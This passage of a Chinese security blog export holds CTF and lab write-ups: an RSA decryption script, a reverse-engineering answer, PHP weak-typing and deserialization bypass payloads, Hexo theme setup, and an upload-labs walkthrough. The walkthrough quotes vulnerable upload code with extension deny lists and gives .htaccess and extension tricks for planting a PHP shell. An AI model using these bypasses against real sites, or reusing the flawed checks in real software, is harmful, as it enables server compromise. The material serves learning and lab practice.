key.key -p 1 -q 1 -e 1 openssl rsautl -decrypt -inkey key.pem -in flag.enc -out flag脚本生成解密密钥12345678910111213141516171819202122# coding=utf-8import mathimport sysfrom Crypto.PublicKey import RSA keypair = RSA.generate(1024)keypair.p =keypair.q =keypair.e =keypair.n = keypair.p * keypair.qQn = long((keypair.p - 1) * (keypair.q - 1)) i = 1while (True): x = (Qn * i) + 1 if (x % keypair.e == 0): keypair.d = x / keypair.e break i += 1private = open(&apos;private.pem&apos;, &apos;w&apos;)private.write(keypair.exportKey())private.close() 解密openssl rsautl -decrypt -in flag.enc -inkey private.pem]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>CTF密码学</tag>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XCTF 逆向 re1-100]]></title>
    <url>%2F2019%2F10%2F08%2FXCTF-%E9%80%86%E5%90%91-re1-100%2F</url>
    <content type="text"><![CDATA[用ida（x64）打开，找到主函数main直接进行分析，找到以下代码： 这一堆的代码看上去就是检查一些东西的，比如说checkStringIsNumber()就是检查字符串是不是全部都是数字. 继续往下走 bufParentRead是我们输入的字符串，查看confuseKey函数： 这里的字符顺序有问题，将我们输入的分成4段然后重新组合，重新组合。我们就直接修改要比较的字符串就好了，变换一下顺序：53fc275d81053ed5be8cdaf29f59034938ae4efd]]></content>
      <categories>
        <category>CTF逆向</category>
      </categories>
      <tags>
        <tag>CTF 逆向</tag>
        <tag>逆向</tag>
        <tag>IDA</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP弱类型]]></title>
    <url>%2F2019%2F10%2F07%2FPHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[0x01 什么是弱类型强类型语言，当你定义一个变量是某个类型，如果不经过代码显式转换（强制转化）过，它就永远都是这个类型，如果把它当做其他类型来用，就会报错 弱类型语言，你想把这个变量当做什么类型来用，就当做什么类型来用，语言的解析器会自动（隐式）转换。 0x02 弱类型整数大小比较1234$temp = $_GET['password'];is_numeric($temp)?die("no numeric"):NULL;if($temp&gt;1336)&#123;echo $flag; is_numeric() 函数用于检测变量是否为数字或数字字符串。如果指定的变量是数字和数字字符串则返回 TRUE，否则返回 FALSE(PHP 版本要求：PHP 4, PHP 5, PHP 7) 在这里先判断是不是数字。然后再判断这个数字是不是大于1336。 可以用数组绕过、%00截断、添加其他字符PHP数组有一个缺陷就是大多数的函数都没有办法去判断数组。 http://123.206.87.240:9009/22.php?password[]=1 http://123.206.87.240:9009/22.php?password=9999a http://123.206.87.240:9009/22.php?password=9999%00 0x03 “==”和“===”php中有两种比较的符号 == 与 === 1234 &lt;?php$a = $b ;$a===$b ;?&gt; === 在进行比较的时候，会先判断两种字符串的类型是否相等，再比较 == 在进行比较的时候，会先将字符串类型转化成相同，再比较。如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行 例子： 1234567891011在$a==$b;中$a=' ';$b=null //true$a=null;$b=true //true $a=0;$b='0' //true$a=0;$b='abcdef ' //true ($a===$b //false)var_dump("admin"==0); //truevar_dump("1admin"==1); //truevar_dump("admin1"==1) //falsevar_dump("admin1"==0) //truevar_dump("0e123456"=="0e4456789"); //true “admin”==0 比较的时候，会将admin转化成数值，强制转化,由于admin是字符串，转化的结果是0,和0相等 “1admin”==1 比较的时候会将1admin转化成数值,结果为1“admin1“被转化为0。当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含’.’,’e’,’E’并且其数值值在整形的范围之内该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。 “0e123456”==”0e456789”相互比较的时候，会将0e这类字符串识别为科学技术法的数字，0的无论多少次方都是零，所以相等 0x04 md5绕过（Hash比较缺陷）12345678910111213141516&lt;?phpif (isset($_GET['Username']) &amp;&amp; isset($_GET['password'])) &#123; $logined = true; $Username = $_GET['Username']; $password = $_GET['password']; if (!ctype_alpha($Username)) &#123;$logined = false;&#125; if (!is_numeric($password) ) &#123;$logined = false;&#125; if (md5($Username) != md5($password)) &#123;$logined = false;&#125; if ($logined)&#123; echo "successful"; &#125;else&#123; echo "login failed!"; &#125; &#125;?&gt; 意思：输入Username（字符串型）和password（数字型），并且两者md5相等，即可成功。 做法：0e在比较的时候会将其视作为科学计数法，所以无论0e后面是什么，0的多少次方还是0。md5(‘240610708’) == md5(‘QNKCDZO’)成功绕过下列是md5开头是0e的字符串： 1234567891011121314151617181920212223242526QNKCDZO0e830400451993494058024219903391s878926199a0e545993274517709034328855841020 s155964671a0e342768416822451524974117254469 s214587387a0e848240448830537924465865611904 s214587387a0e848240448830537924465865611904 s878926199a0e545993274517709034328855841020 s1091221200a0e940624217856561557816327384675 s1885207154a0e5093672134182067008420087635142406107080e462097431906509019562988736854 0x05 json绕过123456789101112131415&lt;?phpif (isset($_POST['message'])) &#123; $message = json_decode($_POST['message']); $key ="*********"; if ($message-&gt;key == $key) &#123; echo "flag"; &#125; else &#123; echo "fail"; &#125; &#125; else&#123; echo "~~~~"; &#125;?&gt; 输入一个json类型的字符串，json_decode函数解密成一个数组，判断数组中key的值是否等于 $key的值，但是$key的值我们不知道，但是可以利用0==”admin”这种形式绕过 最终payload： message={“key”:0} 0x06 strcmp漏洞绕过strcmp是比较两个字符串，如果两者相等 返回0str1小于str2,返回负数 1234567891011&lt;?php $password="***************" if(isset($_POST['password']))&#123; if (strcmp($_POST['password'], $password) == 0) &#123; echo "Right!!!login success";n exit(); &#125; else &#123; echo "Wrong password.."; &#125;?&gt; 要求我们post一个password值，要与给定的password变量的值相等。 password[]=xxx可以绕过 。因为函数接受到了不符合的类型，将发生错误，但是还是判断其相等。 0x07 “array_search”与is_array”绕过is_array:判断传入的是不是一个数组，array_search（x，$数组）:在数组中寻找与指定值(x)相等的值. 实例在数组中搜索键值 “red”，并返回它的键名： 1234&lt;?php$a=array("a"=&gt;"red","b"=&gt;"green","c"=&gt;"blue");echo array_search("red",$a);?&gt; array_search() 函数在数组中搜索某个键值，并返回对应的键名。详细说明 array_search() 函数与 in_array() 一样，在数组中查找一个键值。如果找到了该值，匹配元素的键名会被返回。如果没找到，则返回 false。 如果第三个参数 strict 被指定为 true，则只有在数据类型和值都一致时才返回相应元素的键名 1234567891011121314151617&lt;?phpif(!is_array($_GET['test']))&#123;exit();&#125;$test=$_GET['test'];for($i=0;$i&lt;count($test);$i++)&#123; if($test[$i]==="admin")&#123; echo "error"; exit(); &#125; $test[$i]=intval($test[$i]);&#125;if(array_search("admin",$test)===0)&#123; echo "flag";&#125;else&#123; echo "false";&#125;?&gt; array_search函数 类似于== 也就是$a==”admin” 当然是$a=0 当然如果第三个参数为true则就不能绕过 先判断传入的是不是数组，然后循环遍历数组中的每个值，并且数组中的每个值不能和admin相等，并且将每个值转化为int类型，再判断传入的数组是否有admin，有则返回flag payload: test[]=0可以绕过]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>PHP</tag>
        <tag>后端</tag>
        <tag>弱类型</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hexo Next主题配置]]></title>
    <url>%2F2019%2F10%2F06%2FHexo-Next%E4%B8%BB%E9%A2%98%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[添加评论功能可用的评论系统大概有： HyperComments：https://www.hypercomments.com （来自俄罗斯的评论系统，使用谷歌账号注册。） 来必力：https://livere.com （来自韩国，使用邮箱注册。） 畅言： http://changyan.kuaizhan.com （安装需要备案号。） Gitment： https://github.com/imsun/gitment （有点小bug，比如说每次需要手动初始化，登录时会跳到主页。。） Valine: https://github.com/xCss/Valine 来必力使用方法打开来必力官网：https://livere.com，注册，点击上方的安装，选择免费的city版本。并点击现在安装。 123456789101112131415161718&lt;!-- 来必力City版安装代码 --&gt;&lt;div id="lv-container" data-id="city" data-uid="*************"&gt; &lt;script type="text/javascript"&gt; (function(d, s) &#123; var j, e = d.getElementsByTagName(s)[0]; if (typeof LivereTower === 'function') &#123; return; &#125; j = d.createElement(s); j.src = 'https://cdn-city.livere.com/js/embed.dist.js'; j.async = true; e.parentNode.insertBefore(j, e); &#125;)(document, 'script'); &lt;/script&gt;&lt;noscript&gt; 为正常使用来必力评论功能请激活JavaScript&lt;/noscript&gt;&lt;/div&gt;&lt;!-- City版安装代码已完成 --&gt; 复制其中的uid字段。打开主题目录下的 blog/themes/next/_config.yml 配置文件，定位到 livere_uid 字段，粘贴上刚刚复制的UID。 Next主题背景设置添加背景在 NEXT 预留的自定义样式文件themes/next/source/css/-custom/custom.style中修改 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// 添加背景图片body &#123; background:url(/images/background.jpg); background-repeat: no-repeat; background-attachment:fixed; background-position:50% 50%; background-size: cover; -webkit-background-size: cover; -o-background-size: cover; -moz-background-size: cover; -ms-background-size: cover; /*这是设置底部文字, 看个人需要修改*/ #footer &gt; div &gt; div &#123; color:#eee; &#125; /* .main-inner &#123; margin-top: 60px; padding: 60px 60px 60px 60px; background: #fff; opacity: 0.5; min-height: 500px;&#125;*//*.bg_content &#123;position: fixed;top: 0;z-index: -1;width: 100%;height: 100%;&#125;*///代码块复制按钮.highlight&#123; //方便copy代码按钮（btn-copy）的定位 position: relative;&#125;.btn-copy &#123; display: inline-block; cursor: pointer; background-color: #eee; background-image: linear-gradient(#fcfcfc,#eee); border: 1px solid #d5d5d5; border-radius: 3px; -webkit-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; -webkit-appearance: none; font-size: 13px; font-weight: 700; line-height: 20px; color: #333; -webkit-transition: opacity .3s ease-in-out; -o-transition: opacity .3s ease-in-out; transition: opacity .3s ease-in-out; padding: 2px 6px; position: absolute; right: 5px; top: 5px; opacity: 0;&#125;.btn-copy span &#123; margin-left: 5px;&#125;.highlight:hover .btn-copy&#123; opacity: 1;&#125;&#125;// Custom styles. 透明背景内容部分在themes\next\source\css_schemes\Pisces_layout.styl 文件 .content-wrap 标签下 background: white修改为： 1background: rgba(255,255,255,0.3); //0.3是透明度 菜单栏在themes\next\source\css_schemes\Pisces_layout.styl 文件 .header-inner 标签下 background: white修改为： 1background: rgba(255,255,255,0.3); //0.3是透明度 站点概况在 themes\next\source\css_schemes\Pisces_sidebar.styl 文件 .sidebar-inner 标签下 background: white修改为： 1234567891011121314151617background: rgba(255,255,255,0.3); //0.3是透明度``` 然后修改博客根目录 themes\next\source\css\_schemes\Pisces\_layout.styl 文件 .sidebar 标签下 background: $body-bg-color修改为：``` bashbackground: rgba(255,255,255,0.3); //0.3是透明度``` #### 按钮背景themes\next\source\css\_common\components\post\post-button.styl 同上修改对应位置为 background: transparent;## next主题设置首页显示预览themes/next目录，用文本编辑器打开_config.yml文件 搜索"auto_excerpt",找到如下部分： ``` bash auto_excerpt: enable: false length: 150 把enable改为对应的false改为true Hexo添加标签和分类首先打开theme/next/_config.yml，找到如下配置，删除”categories”和“tags”前的注释符#。 123456789menu: home: / || home about: /about/ || user tags: /tags/ || tags categories: /categories/ || th archives: /archives/ || archive #schedule: /schedule/ || calendar #sitemap: /sitemap.xml || sitemap #commonweal: /404/ || heartbeat 进入博客根目录下，执行如下两条命令： 12$ hexo create page tags$ hexo create page categories 打开要分类的文章，在文件头添加“tags”标签或“categories”进行分类。 12345678title: hexo 添加标签和分类 date: 2019-10-01 09:01:56categories: - hexo- tagstags:- hexo- tags 完成后hexo g,hexo s。 统计访客数在\themes\next_config.yml中找到busuanzi_count:并进行更改： 123456789101112131415busuanzi_count: # count values only if the other configs are false enable: true # custom uv span for the whole site site_uv: true site_uv_header: &lt;i class="fa fa-user"&gt;&lt;/i&gt; 访问人数 site_uv_footer: # custom pv span for the whole site site_pv: true site_pv_header: &lt;i class="fa fa-eye"&gt;&lt;/i&gt; 总访问量 site_pv_footer: 次 # custom pv span for one page only page_pv: true page_pv_header: &lt;i class="fa fa-file-o"&gt;&lt;/i&gt; 浏览 page_pv_footer: 次 添加文章结束标识 在路径 /themes/next/layout/_macro 中新建 passage-end-tag.swig 文件,并添加以下内容： 12345&lt;div&gt; &#123;% if not is_index %&#125; &lt;div style="text-align:center;color: #ccc;font-size:14px;"&gt;------ 本文结束------&lt;/div&gt; &#123;% endif %&#125;&lt;/div&gt; 打开 themes/next/layout/_macro/post.swig 文件,添加： 12345&lt;div&gt; &#123;% if not is_index %&#125; &#123;% include 'passage-end-tag.swig' %&#125; &#123;% endif %&#125; &lt;/div&gt; 然后打开主题配置文件 _config.yml,在末尾添加： 12passage_end_tag:enabled: true 添加代码复制下载插件clipboard.js 。打开 themes/next/source/lib/ ,新建文件夹 clipboard。把下载 clipboard.js下的 src 文件夹下的文件拖动到 clipboard文件夹下。打开 themes/next/source/js/src/ ,新建文件 custom.js ,代码如下: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102//此函数用于创建复制按钮function createCopyBtns() &#123; var $codeArea = $("figure table"); //查看页面是否具有代码区域，没有代码块则不创建 复制按钮 if ($codeArea.length &gt; 0) &#123; //复制成功后将要干的事情 function changeToSuccess(item) &#123; $imgOK = $("#copyBtn").find("#imgSuccess"); if ($imgOK.css("display") == "none") &#123; $imgOK.css(&#123; opacity: 0, display: "block" &#125;); $imgOK.animate(&#123; opacity: 1 &#125;, 1000); setTimeout(function() &#123; $imgOK.animate(&#123; opacity: 0 &#125;, 2000); &#125;, 2000); setTimeout(function() &#123; $imgOK.css("display", "none"); &#125;, 4000); &#125;; &#125;; //创建 全局复制按钮，仅有一组。包含：复制按钮，复制成功响应按钮 //值得注意的是：1.按钮默认隐藏，2.位置使用绝对位置 position: absolute; (position: fixed 也可以，需要修改代码) $(".post-body").before('&lt;div id="copyBtn" style="opacity: 0; position: absolute;top:0px;display: none;line-height: 1; font-size:1.5em"&gt;&lt;span id="imgCopy" &gt;&lt;i class="fa fa-paste fa-fw"&gt;&lt;/i&gt;&lt;/span&gt;&lt;span id="imgSuccess" style="display: none;"&gt;&lt;i class="fa fa-check-circle fa-fw" aria-hidden="true"&gt;&lt;/i&gt;&lt;/span&gt;'); //创建 复制 插件，绑定单机时间到 指定元素，支持JQuery var clipboard = new Clipboard('#copyBtn', &#123; target: function() &#123; //返回需要复制的元素内容 return document.querySelector("[copyFlag]"); &#125;, isSupported: function() &#123; //支持复制内容 return document.querySelector("[copyFlag]"); &#125; &#125;); //复制成功事件绑定 clipboard.on('success', function(e) &#123; //清除内容被选择状态 e.clearSelection(); changeToSuccess(e); &#125;); //复制失败绑定事件 clipboard.on('error', function(e) &#123; console.error('Action:', e.action); console.error('Trigger:', e.trigger); &#125;); //鼠标 在复制按钮上滑动和离开后渐变显示/隐藏效果 $("#copyBtn").hover( function() &#123; $(this).stop(); $(this).css("opacity", 1); &#125;, function() &#123; $(this).animate(&#123; opacity: 0 &#125;, 2000); &#125; ); &#125;&#125;//感应鼠标是否在代码区$("figure").hover( function() &#123; //-------鼠标活动在代码块内 //移除之前含有复制标志代码块的 copyFlag $("[copyFlag]").removeAttr("copyFlag"); //在新的（当前鼠标所在代码区）代码块插入标志：copyFlag $(this).find(".code").attr("copyFlag", 1); //获取复制按钮 $copyBtn = $("#copyBtn"); if ($copyBtn.lenght != 0) &#123; //获取到按钮的前提下进行一下操作 //停止按钮动画效果 //设置为 显示状态 //修改 复制按钮 位置到 当前代码块开始部位 //设置代码块 左侧位置 $copyBtn.stop(); $copyBtn.css("opacity", 0.8); $copyBtn.css("display", "block"); $copyBtn.css("top", parseInt($copyBtn.css("top")) + $(this).offset().top - $copyBtn.offset().top + 3); $copyBtn.css("left", -$copyBtn.width() - 3); &#125; &#125;, function() &#123; //-------鼠标离开代码块 //设置复制按钮可见度 2秒内到 0 $("#copyBtn").animate(&#123; opacity: 0 &#125;, 2000); &#125;);//页面载入完成后，创建复制按钮$(document).ready(function() &#123; createCopyBtns();&#125;); 打开 themes/next/layout/_custom/ ,新建文件 custom.swig ，代码如下: 12&lt;script type="text/javascript" src="/lib/clipboard/clipboard.js"&gt;&lt;/script&gt;&lt;script type="text/javascript" src="/js/src/custom.js"&gt;&lt;/script&gt; 修改文件 themes/next/layout/_layout.swig ,在标签 上面插入代码: 1&#123;% include '_custom/custom.swig' %&#125; 参考：https://zhuanlan.zhihu.com/p/30836436https://www.jianshu.com/p/efbeddc5eb19https://blog.csdn.net/zgcr654321/article/details/86751765]]></content>
      <categories>
        <category>Hexo</category>
      </categories>
      <tags>
        <tag>Hexo</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP反序列化漏洞（1）]]></title>
    <url>%2F2019%2F10%2F06%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%881%EF%BC%89%2F</url>
    <content type="text"><![CDATA[背景Serialize() //将一个对象转换成一个字符串 unserialize() //将字符串还原成一个对象 通过序列化与反序列化我们可以很方便的在PHP中进行对象的传递。本质上反序列化是没有危害的。但是如果用户对数据可控那就可以利用反序列化构造payload攻击。 常见方法__construct()//创建对象时触发__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__invoke() //当脚本尝试将对象调用为函数时触发 比较重要的方法__sleep()serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。 __wakeup()unserialize() 会检查是否存在一个 __wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。 wakeup()函数用法:wakeup()是用在反序列化操作中。unserialize()会检查存在一个wakeup()方法。如果存在，则先会调用wakeup()方法。 123456789&lt;?phpclass A&#123;function __wakeup()&#123;echo 'Hello';&#125;&#125;$c = new A();$d=unserialize('O:1:"A":0:&#123;&#125;');?&gt; 最后页面输出了Hello。在反序列化的时候存在__wakeup()函数，所以最后就会输出Hello。 __wakeup()函数漏洞说明: 1234567891011121314&lt;?phpclass Student&#123;public $full_name = 'zhangsan';public $score = 150;public $grades = array();function __wakeup() &#123;echo "__wakeup is invoked";&#125;&#125;$s = new Student();var_dump(serialize($s));?&gt; 最后页面上输出的就是Student对象的一个序列化输出:O:7:”Student”:3:{s:9:”full_name”;s:8:”zhangsan”;s:5:”score”;i:150;s:6:”grades”;a:0:{}}其中在Stuedent类后面有一个数字3，整个3表示的就是Student类存在3个属性。 wakeup()漏洞就是与整个属性个数值有关。当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过wakeup的执行。当我们将上述的序列化的字符串中的对象属性个数修改为5，变为 1234567O:7:"Student":5:&#123;s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:&#123;&#125;&#125; 最后执行运行的代码如下: 123456789101112131415class Student&#123;public $full_name = 'zhangsan';public $score = 150;public $grades = array();function __wakeup() &#123;echo "__wakeup is invoked";&#125;function __destruct() &#123;var_dump($this);&#125;&#125;$s = new Student();$stu = unserialize('O:7:"Student":5:&#123;s:9:"full_name";s:8:"zhangsan";s:5:"score";i:150;s:6:"grades";a:0:&#123;&#125;&#125;'); 这样就成功地绕过了__wakeup()函数。 例子： 12345678910&lt;?phpclass xctf&#123; //定义一个名为xctf的类public $flag = '111'; //定义一个公有的类属性$flag，值为111public function __wakeup()&#123; //定义一个公有的类方法__wakeup()，输出bad requests后退出当前脚本exit('bad requests');&#125;&#125;$test = new xctf(); //使用new运算符来实例化该类（xctf）的对象为testecho(serialize($test)); //输出被序列化的对象（test）?&gt; 执行结果 O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;},要反序列化xctf类的同时还要绕过wakeup方法的执行,如果不绕过就会输出bad requests并退出。修改：http://111.198.29.45:50545/?code=O:4:%22xctf%22:5:{s:4:%22flag%22;s:3:%22111%22;}]]></content>
      <categories>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>CTF Web</tag>
        <tag>PHP</tag>
        <tag>反序列化漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[文件上传漏洞]]></title>
    <url>%2F2019%2F10%2F04%2F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[pass-01能有上传点，就先上传一句话试一试，这道题给出的是前端检测，只允许.jpg|.png|.gif上传 解决方法很多，第一种是找到约束上传条件的checkFile(),将其删掉，就直接可以上传.php文件或者是将checkFile()里添加.php也能上传一句话但更通用的办法是：将.php文件隐藏成.jpg，然后再从抓包里面改回.php，这在下面的题中也 有用到。 pass-02第二题同样先上传一句话 这道题同样是文件类型不对，与第一题同属于文件后缀检验，但不是前端检测，然后我再源码中发现了么样一段东西。 12345678910111213141516171819202122232425&lt;?phpinclude '../config.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; if (($_FILES['upload_file']['type'] == 'image/jpeg') || ($_FILES['upload_file']['type'] == 'image/png') || ($_FILES['upload_file']['type'] == 'image/gif')) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH . '/' . $_FILES['upload_file']['name']; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '文件类型不正确，请重新上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH.'文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 发现是上传的时候只允许image/jpeg。 可以直接在抓包中改Content-Type为image/gif，又因为我们前面有传上的一句话，所以能上传成功。 pass-03这个题也很直接，直接将.php加入黑名单。 12345678910111213141516171819202122232425262728293031323334&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array('.asp','.aspx','.php','.jsp'); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if(!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '不允许上传.asp,.aspx,.php,.jsp后缀文件！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 两种解决方法： 先上传一个.htaccess文件，里面写入 123&lt;FilesMatch "1.jpg"&gt;SetHandler application/x-httpd-php&lt;/FilesMatch&gt; 通过.htaccess文件调用php解析器去解析一个文件名中只要包含”1.jpg”这个字符串的任意文件，无论扩展名是什么(没有也行)，都以php的方式来解析，和我们再上传一个图片木马就能接上传成功 直接上传.php3|.php5（只要后缀能被服务器解析就行） pass-04 12345678910111213141516171819202122232425262728293031323334&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2","php1",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2","pHp1",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传!'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 可以看到这道题限制的后缀很多，但不管限制什么，只要能将.htaccess上传上，后面上传的全都按照.php解析，或者直接上传.PHP(这个没被限制) pass-05 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 第五题看起来和第四题也差不多，看源码也差不多，区别是它限制了.htaccess，但是他没转小写，只要将原先的一句话改为.PHP可以 pass-06 123456789101112131415161718192021222324252627282930313233&lt;?phpinclude '../config.php';include '../common.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = $_FILES['upload_file']['name']; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date("YmdHis").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件不允许上传'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; &#125;&#125;?&gt; 这道题的黑名单也比较全，但是没有首尾去空，可以.(空格)php但是.php(空格)不行，因为windos自动去尾。 pass-07 1234567891011121314151617181920212223242526272829303132&lt;?phpinclude '../config.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(".php",".php5",".php4",".php3",".php2",".html",".htm",".phtml",".pht",".pHp",".pHp5",".pHp4",".pHp3",".pHp2",".Html",".Htm",".pHtml",".jsp",".jspa",".jspx",".jsw",".jsv",".jspf",".jtml",".jSp",".jSpx",".jSpa",".jSw",".jSv",".jSpf",".jHtml",".asp",".aspx",".asa",".asax",".ascx",".ashx",".asmx",".cer",".aSp",".aSpx",".aSa",".aSax",".aScx",".aShx",".aSmx",".cEr",".sWf",".swf",".htaccess"); $file_name = trim($_FILES['upload_file']['name']); $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; &#125; else &#123; $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！'; 